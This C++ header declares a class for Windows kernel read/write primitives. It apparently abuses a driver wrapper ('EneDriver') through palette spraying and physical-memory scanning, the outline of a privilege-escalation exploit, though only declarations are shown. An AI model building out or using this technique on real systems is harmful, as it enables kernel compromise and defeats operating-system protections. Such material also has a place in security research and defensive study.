#pragma once

#include <vector>
#include <algorithm>

#include "EneDriver.h"
#include "Palette.h"

/*
	Implements kernel virtual read/write primitives
*/
class KernelReadWrite {
public:
	KernelReadWrite(const std::string& DriverPath);

	ULONG64 ReadQword(PVOID Address);

	VOID WriteQword(ULONG64 Value, PVOID Address);

private:
	EneDriver driver;
	HPALETTE foundPaletteHandle = nullptr;
	// pointer to physical page containing the palette
	PALETTE64* foundPaletteAddress = nullptr;

	/*
		Creates a ton of palettes.
	*/
	VOID SprayPalettes(std::vector<HPALETTE>& Palettes);

	/*
		Finds a palette based on physical-memory scanning.
	*/
	VOID FindMappedPalette(const std::vector<HPALETTE>& Palettes);

	/*
		Frees any unused palettes.
	*/
	VOID FreeOtherPalettes(const std::vector<HPALETTE>&& Palettes);
};